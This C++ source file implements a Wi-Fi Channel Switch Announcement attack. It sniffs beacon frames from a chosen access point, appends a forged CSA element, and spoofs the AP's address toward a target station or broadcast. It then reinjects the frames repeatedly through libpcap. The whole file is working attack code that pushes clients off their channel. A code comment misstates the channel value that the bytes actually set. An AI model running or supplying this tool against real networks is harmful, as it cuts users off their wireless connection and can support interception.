#include "CaptureCsaAttack.h"
#include "Dot11.h"
#include "Radiotap.h"
#include <vector>
#include <csignal>
#include <atomic>
#include <thread>
#include <chrono>
#include <iostream>
#include <cstring>

static std::atomic<bool> g_running{true};
static pcap_t* g_handle = nullptr;
static MacAddr g_apMac;
static bool g_useStation = false;
static MacAddr g_stMac;

// forward declarations
static void handlePacket(u_char* userData, const struct pcap_pkthdr* header, const u_char* packet);
static bool insertCsaTag(std::vector<uint8_t>& frame);
static bool rewriteAddr(std::vector<uint8_t>& frame);

// SIGINT handler
static void signalHandlerCsa(int signo) {
    g_running = false;
    if (g_handle) {
        pcap_breakloop(g_handle);
    }
}

void startCaptureCsa(pcap_t* handle, const MacAddr& apMac, const MacAddr* stationMac) {
    g_handle = handle;
    g_apMac = apMac;
    if (stationMac) {
        g_useStation = true;
        g_stMac = *stationMac;
    } else {
        g_useStation = false;
    }

    signal(SIGINT, signalHandlerCsa);

    std::cout << "[*] Starting capture loop (CSA Attack)...\n";
    pcap_loop(handle, 0, handlePacket, reinterpret_cast<u_char*>(handle));
    std::cout << "[*] Capture loop ended.\n";
}

static void handlePacket(u_char* userData, const struct pcap_pkthdr* header, const u_char* packet) {
    if (!g_running) {
        pcap_breakloop(reinterpret_cast<pcap_t*>(userData));
        return;
    }

    // 1) Radiotap length
    int radiotapLen = radiotapParseLen(packet, header->len);
    if (radiotapLen < 0) {
        return; // invalid radiotap
    }

    // 2) Dot11
    const uint8_t* dot11Ptr = packet + radiotapLen;
    int dot11Len = header->len - radiotapLen;
    if (dot11Len < 24) return;

    const Dot11Hdr* dot11 = reinterpret_cast<const Dot11Hdr*>(dot11Ptr);
    // subtype check => beacon=0x80
    if ((dot11->frameControl & 0x00FF) != 0x80) {
        return;
    }
    // bssid => addr3
    MacAddr bssid(dot11->addr3);
    if (bssid != g_apMac) {
        return; // not target AP
    }

    // 3) copy beacon
    std::vector<uint8_t> beacon(dot11Ptr, dot11Ptr + dot11Len);
    // remove FCS
    if (beacon.size() > 4) {
        beacon.resize(beacon.size() - 4);
    }

    // 4) insert CSA
    if (!insertCsaTag(beacon)) {
        return;
    }

    // 5) rewrite MAC
    if (!rewriteAddr(beacon)) {
        return;
    }

    // 6) build outPacket with new Radiotap
    std::vector<uint8_t> outPacket;
    outPacket.resize(beacon.size() + 8); // 8 for radiotap

    // create radiotap
    radiotapCreateHeader(outPacket.data(), outPacket.size());

    // copy beacon behind
    memcpy(outPacket.data() + 8, beacon.data(), beacon.size());

    // 7) send
    pcap_t* p = reinterpret_cast<pcap_t*>(userData);
    if (pcap_sendpacket(p, outPacket.data(), outPacket.size()) != 0) {
        std::cerr << "[!] pcap_sendpacket err: " << pcap_geterr(p) << "\n";
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(50));
}

// insert CSA
static bool insertCsaTag(std::vector<uint8_t>& frame) {
    if (frame.size() < 36) return false;
    // 5B (tag#:0x25, len=3, [0x01, 0x0B, 0x03])
    static const uint8_t csa[5] = {0x25, 0x03, 0x01, 0x06, 0x03};
    frame.insert(frame.end(), csa, csa + 5);
    return true;
}

static bool rewriteAddr(std::vector<uint8_t>& frame) {
    if (frame.size() < 24) return false;
    // addr1 => station or broadcast
    if (g_useStation) {
        memcpy(&frame[4], g_stMac.data(), 6);
    } else {
        memset(&frame[4], 0xFF, 6);
    }
    // addr2, addr3 => ap
    memcpy(&frame[10], g_apMac.data(), 6);
    memcpy(&frame[16], g_apMac.data(), 6);
    return true;
}
